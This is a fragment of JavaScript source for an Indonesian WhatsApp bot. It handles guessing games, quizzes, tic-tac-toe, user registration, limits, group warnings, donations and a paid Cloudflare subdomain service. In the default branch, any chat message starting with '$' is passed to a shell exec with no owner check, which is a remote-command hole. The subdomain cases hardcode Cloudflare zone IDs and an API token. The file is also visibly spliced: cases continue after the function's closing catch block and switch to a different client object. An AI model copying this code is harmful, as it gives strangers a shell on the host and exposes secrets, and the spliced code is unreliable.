 hadiah: 6,
 }
}break
//=================================================//
case 'tebak': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
 if (!text) return reply(`Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`)
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await JSON.parse(fs.readFileSync('./HinataBase/database/Games/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await hinata.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 hinata.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hinata.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4e110b3ffe3f6350d08e6.jpg' }, caption:`Waktu Habis ⌛\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik ${prefix + command} lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 hinata.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hinata.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4e110b3ffe3f6350d08e6.jpg' }, caption: `Waktu Habis ⌛\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik ${prefix + command} gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 hinata.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hinata.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4e110b3ffe3f6350d08e6.jpg' }, caption: `Waktu Habis ⌛\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik ${prefix + command} kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 hinata.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hinata.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4e110b3ffe3f6350d08e6.jpg' }, caption:`Waktu Habis ⌛\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik ${prefix + command} kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 hinata.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hinata.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4e110b3ffe3f6350d08e6.jpg' }, caption: `Waktu Habis ⌛\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik ${prefix + command} lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 hinata.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hinata.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4e110b3ffe3f6350d08e6.jpg' }, caption:`Waktu Habis ⌛\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik ${prefix + command} lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break
//=================================================//
case 'kuismath': case 'math': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let { genMath, modes } = require('./src/math')
 if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
 let result = await genMath(text.toLowerCase())
 hinata.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
 delete kuismath[m.sender.split('@')[0]]
 }
}
break
//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let TicTacToe = require("./HinataBase/lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return reply('Kamu masih didalam game')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await hinata.sendText(room.x, str, m, { mentions: parseMention(str) } )
await hinata.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
break
//=================================================//
case 'suitpvp': case 'suit': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await hinata.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) hinata.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}break
//=================================================//
case 'addlimit': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let who
if (m.isGroup) who = m.mentionedJid[0]
else who = m.chat
if (!who) return reply('✳️ Tag orangnya')
let txt = text.replace('@' + who.split`@`[0], '').trim()
if (!txt) return reply('✳️ Masukkan jumlah *Limit* yang ingin di tambahkan')
if (isNaN(txt)) return reply('🔢 hanya angka')
let dmt = parseInt(txt)
let limit = dmt
if (limit < 1) return reply('✳️ Minimal *1*')
let users = global.db.data.users
users[who].limit += dmt
await reply(`≡ *⚡ DITAMBAHKAN*
┌──────────────
▢ *Total:* ${dmt}
└──────────────`)
}break
//=================================================//
case 'limit': {
let userhh = global.db.data.users[m.sender]
if (userhh.registered === false) return HinataReg()
let who = m.quoted ? m.quoted.sender : m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? hinata.user.jid : m.sender
let user = global.db.data.users[who]
if (!(who in global.db.data.users)) throw `✳️ Pengguna tidak ditemukan di database`
reply(`
┌───⊷ *DAILY LIMIT* ⊶
▢ *👤 Nama* : @${who.split('@')[0]}
▢ *⚡ Limit* : ${isPrem ? 'Unlimitid' : user.limit}
└──────────────
`)
}break
//=================================================
case 'risetlimit': {
let userhh = global.db.data.users[m.sender]
if (userhh.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let user = Object.keys(global.db.data.users)
let limitUser = global.limiuser
for (let jid of user) global.db.data.users[jid].limit = limitUser
m.reply('Limit telah di setel ulang ✔️')
}break
//=================================================
case 'hapus': case 'delete': case 'delet': {
hinata.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender }})
}break
//=================================================
case 'status': {
let who = m.quoted ? m.quoted.sender : m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? hinata.user.jid : m.sender
let user = global.db.data.users[who]
let me = m.sender
if (!(who in global.db.data.users)) return m.reply(`✳️ Anda belum ada di database`)
let { name, limit, registered, regTime, age, warn } = global.db.data.users[who]
let username = hinata.getName(who)
let sn = createHash('md5').update(who).digest('hex')
let str =`
   ()   ()
 („• ֊ •„)
━O━O━━━━━━━━━━
꒰ 📝 ~𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥~ ꒱ ೄྀ࿐ ˊˎ-
━━━━━━⊱⋆⊰━━━━━━
👤 *Nama :* ${username}
📱 *Nomer :* ${PhoneNumber('+' + who.replace('@s.whatsapp.net', '')).getNumber('international')}
🔗 *Link :* wa.me/${who.split`@`[0]}${registered ? '\n🎈 *Usia :* ' + age + ' tahun' : ''}
📇 *Pendaftaran :* ${registered ? 'Sudah Terdaftar *✓*': 'Belum Terdaftar *×*'}
🌟 *Status :* ${isPrem ? 'Premium' : `Free`}
💎 *Limit :* ${isPrem ? 'Unlimitid' : limit}
⚠️ *Warn :* ${warn}/${global.maxwarn}
🎀 *Nomor Seri :* \`\`\`${sn}\`\`\`
━━━━━━⊱⋆⊰━━━━━━`
try {
ppuser = await hinata.profilePictureUrl(who, 'image')
} catch {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
hinata.sendMessage(m.chat, { image: { url: ppuser }, mentions: [who], caption: str })
}break
//=================================================
case 'warn': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
let who
if (m.isGroup) who = m.mentionedJid[0]
if (!who) return reply('✳️ Tag orangnya')
let txt = text.replace('@' + who.split`@`[0], '').trim()
if (!txt) return reply('✳️ Masukkan alasan di peringatkan')
let users = global.db.data.users
users[who].warn += 1
await reply(`\`\`\`「 ⚠️ PERINGATAN ⚠️ 」\`\`\`


Halo @${who.split('@')[0]} anda telah di beri peringatan ❗

Dengan alasan :
┌───────────⊷
▢ *${txt}*
└───────────⊷
⚠️ *Total*: ${users[who].warn} Peringatan

Jika anda sudah di peringatkan ${global.maxwarn}× maka anda akan otomatis di keluarkan dari grup

Silahkan lihat info anda dengan mengetik *.status*
Terimakasih..
`)
}break
//=================================================
case 'delwarn': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
let who
if (m.isGroup) who = m.mentionedJid[0]
if (!who) return reply('✳️ Tag orangnya')
let users = global.db.data.users
users[who].warn = 0
await reply(`\`\`\`「 🎊SELAMAT🎊 」\`\`\`


Halo @${who.split('@')[0]} 
Slamat anda sekarang bebas, karena sudah tidak memiliki peringatan

Silahkan lihat info anda dengan mengetik *.status*
Terimakasih..
`)
}break
//=================================================
case 'reg': case 'register': case 'registrasi': {
let Reg = /\|?(.*)([.|] *?)([0-9]*)$/i
let user = global.db.data.users[m.sender]
let name2 = hinata.getName(m.sender)
if (user.registered === true) return reply(`✳️ Anda sudah terdaftar\n\nApakah Anda ingin mendaftar lagi?\n\n 📌 Gunakan perintah ini untuk menghapus registrasi Anda \n*${prefix}unreg* <Nomor seri>`)
if (!Reg.test(text)) return reply(`⚠️ Format salah\n\n✳️ Gunakan perintah: *${prefix+command} nama.Usia*\n\n📌 Contoh : *${prefix+command}* ${name2}.25`)
let [_, name, splitter, age] = text.match(Reg)
if (!name) return reply('❗ Nama tidak boleh kosong')
if (!age) return reply('❗ Usia tidak boleh kosong')
if (name.length >= 30) return reply('❗ Namanya terlalu panjang')
age = parseInt(age)
if (age > 85) return reply('👴🏻 Wah aki aki mau main bot')
if (age < 10) return reply('🚼 Maaf anda belum cukup Usia.\nMinimal usia harus di atas 10 tahun.. ')
user.name = name.trim()
user.age = age
user.regTime = + new Date
user.registered = true
let sn = createHash('md5').update(m.sender).digest('hex')
m.reply(`
┌─「 *TERDAFTAR* 」─
▢ *Nama:* ${name}
▢ *Usia* : ${age} Tahun
▢ *Nomor seri* :
${sn}
└──────────────

 *${prefix}help* untuk menonton Menu
`.trim())
}break
//=================================================
case 'nseri': case 'ns': {
let sn = createHash('md5').update(m.sender).digest('hex')
m.reply(`
▢ *Nomor seri* : ${sn}
`.trim())
}break
//=================================================
case 'unreg': {
if (!args[0]) throw `✳️ *Masukkan nomor seri*\nVerifikasi nomor seri Anda dengan perintah...\n\n*${prefix}nseri*`
let user = global.db.data.users[m.sender]
let sn = createHash('md5').update(m.sender).digest('hex')
if (args[0] !== sn) return reply('⚠️ *Nomor seri salah*')
user.registered = false
m.reply(`Unreg Berhasil ✅`)
}break
//=================================================
case 'donate': case 'donasi': {
let don = `
≡ *DONATION*
Anda dapat berdonasi jika ingin membantu menjaga bot tetap aktif

▢ *PayPal*
• *Link :* https://paypal.me/AnGgIt86

▢ *Dana*
• *Nomer :* 089629929193
`
let img = 'https://i.ibb.co/37FP2bk/donate.jpg'
//hinata.sendFile(m.chat, img, 'img.jpg', don, m)
hinata.sendFile(from, img, "img.jpg", m, { caption: don })
}
//=================================================
/**
⢀⣀⣤⣤⣤⣴⠶⠦⢤⣄⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⣧⠀⢄⠀⠀⠀⠰⡀⠀⠉⠈⠙⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⣆⠀⠙⠢⣀⠀⢳⠀⠀⢸⠀⠈⠛⢷⠴⠲⠤⣄⣀⡤⠤⢤⣀⣀⠀⠀⢀⣠⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⠀⠀⠀⠈⠳⢾⡀⠀⠀⡇⢀⡴⠋⠀⣠⣞⣉⣀⠀⢀⣀⣀⣉⠙⢶⡋⠀⠀⠙⢶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⢧⡀⠐⠢⠤⠼⠛⢶⣼⢷⣿⠞⢩⠟⠋⣁⡴⠛⣉⣉⠤⢤⣉⡉⠓⠿⣟⠲⢄⡀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⣿⡆⠀⠀⠀⢀⣀⣿⠟⠁⣰⠃⠀⡴⢋⡴⠊⣁⣀⣀⠀⠀⠙⢿⠲⢾⡆⠀⠈⠙⢺⡷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢦⣈⠉⣩⣿⡁⠀⡞⢻⠀⢸⠃⢸⣅⡞⠁⠀⠸⣝⣦⠀⠈⡇⠈⣷⠀⠀⠀⢠⡇⠀⣹⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣴⠛⠋⠁⠀⠳⡄⠻⡌⠳⣼⣤⡏⠙⢧⡀⢀⣀⡼⢈⣧⣀⡿⢡⠟⠀⠆⠀⢨⣧⣠⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⡆⠀⠀⠀⠀⠻⣄⠈⢻⣦⣍⣳⣤⣀⣙⣶⣶⡯⠭⠤⠤⠾⣿⣶⡾⠀⣠⠟⠹⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢇⠀⠀⢹⣦⡀⠙⢦⡉⠙⠓⠶⠦⠤⠤⠴⠒⠛⢩⡿⠋⣀⡼⠁⠀⢠⣧⣄⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠈⠳⣄⡀⣧⠉⠳⢤⡙⢦⡀⠀⠀⠀⠀⠀⣠⠞⣉⣠⠾⠛⠁⣀⣴⠟⣀⠀⠉⢿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⢷⣄⠀⠀⠀⠙⠻⠦⣄⣤⣽⠶⠿⠦⠴⠖⠒⠛⠛⣉⣁⣠⣤⡶⠛⢩⡟⠉⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣨⣿⣶⣤⣄⡀⠀⠀⠉⠙⠛⠿⠿⣿⣛⠛⠋⠉⠉⠁⠀⣼⠀⠀⣼⣧⣀⣠⠴⠒⠊⠉⠀⢼⡇⠀⠀
⠀⠀⠀⠀⠀⣀⡴⠟⠉⠀⡀⠀⠸⡏⠉⠙⠒⠶⠤⠤⠤⠴⣾⠙⣧⠀⠀⠀⠀⢠⡇⠀⢰⡏⢻⡉⠙⠒⠢⠤⣀⡀⠀⠹⣆⠀
⠀⠀⠀⣠⠞⠉⠀⣀⠀⠀⠈⠉⢓⣿⣄⠀⠀⠀⠀⠀⠀⠀⢻⣄⠈⢧⡀⠀⢀⣾⣤⢶⡏⠀⠀⠳⡄⠀⠀⠀⠀⠀⢀⣀⡽⠆
⠀⠀⢨⡟⠁⠀⠀⠀⠈⠙⣲⡶⢿⠁⢻⢦⣀⠀⠀⠀⠀⠀⠀⠈⠳⣜⡇⣠⠟⠁⠀⠠⣿⣤⣴⡤⣤⣤⡶⠖⠚⠛⠉⠁⠀⠀
⠀⢠⡟⠀⠠⠤⠤⣤⡴⢾⠉⠀⢸⠀⠸⠀⣹⠗⠦⣤⣀⣀⣀⣀⣠⡼⣿⠉⠑⠦⣀⠀⢹⡄⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢺⡇⠀⠀⢀⠔⠋⠀⡏⠀⠀⠄⢀⡀⣴⠏⠀⠀⠀⢹⡍⠉⠀⠀⡰⢻⣆⠀⠀⠀⠁⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⠀⢀⠖⠁⠀⠀⠸⠀⢀⣄⣠⠞⠟⠁⠀⠀⠀⠀⠘⣷⡆⠀⡰⠁⠈⡏⠙⢦⡀⠀⣰⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣀⣀⣤⠤⣶⣤⠴⠚⠉⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡔⠁⠀⠀⢻⠀⠀⠘⢂⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⡀⠀⠸⡄⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣆⠈⠀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
**/
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return hinatareplyban()
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return hinatareplyowner()
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
hinata.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
console.log(util.format(err))
let e = util.format(err)
hinata.sendMessage(`${global.ownernumber}@s.whatsapp.net`, {text: 'Halo owner, Ada yg error nih\n\n' + e})
}
}
case 'domainmenu':
case 'domain':
case 'subdomain':{
let domain = (`▭▬▭( *DOMAIN MENU* )▭▬▭

┏━ ◦ ${prefix}domain1 jasa-panel.my.id 
┣❏ ◦ ${prefix}domain2 didinsec.biz.id 
┣❏ ◦ ${prefix}domain3 putraoffc.cfd 
┣❏ ◦ ${prefix}domain4 sellerpannel.my.id 
┣❏ ◦ ${prefix}domain5 pannelku.icu
┣❏ ◦ ${prefix}domain6 pannelku.cfd
┣❏ ◦ ${prefix}domain7 putraoffc.site
┣❏ ◦ ${prefix}domain8 putraoffc.com 
┣❏ ◦ ${prefix}domain9 kangpannel.xyz 
┣❏ ◦ ${prefix}domain10 mypannelku.com 
┣❏ ◦ ${prefix}domain11 pannelmurah.xyz
┣❏ ◦ ${prefix}domain12 storepannel.xyz
┣❏ ◦ ${prefix}domain13 tokopannel.xyz
┣❏ ◦ ${prefix}domain14 mypannel.cfd
┣❏ ◦ ${prefix}domain15 adminpannel.xyz
┣❏ ◦ ${prefix}domain16 mypannel.icu
┣❏ ◦ ${prefix}domain17 tokocpannelmurah.xyz
┗━ ◦ ${prefix}domain18 websitepannelmurah.com

*NOTE :*
_*DOMAIN INI YANG BERSANGKUTAN DENGAN WHM / CPANEL OTOMATIS DI KICK + NOREFFUND !*_

*JOIN RESELLER SUBDOMAIN*?
_CHAT ANDI OFFC⚡_
wa.me/6283151983314`)
ZassTdr.sendMessage(m.chat, {
text: domain,
contextInfo: {
externalAdReply: {
title: namaownernya,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/832778d1023ed5ff024f8.jpg',
sourceUrl: "https://chat.whatsapp.com/C5t7coy3AkC67g2qYjdko8",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}

break

 case 'domain1': {
 
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "ab732313828957ac4dfa9dd05ecdbea4";
    let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
    let tld = "jasa-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ANDI OFFC⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain2': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283151983314")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "didinsec.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
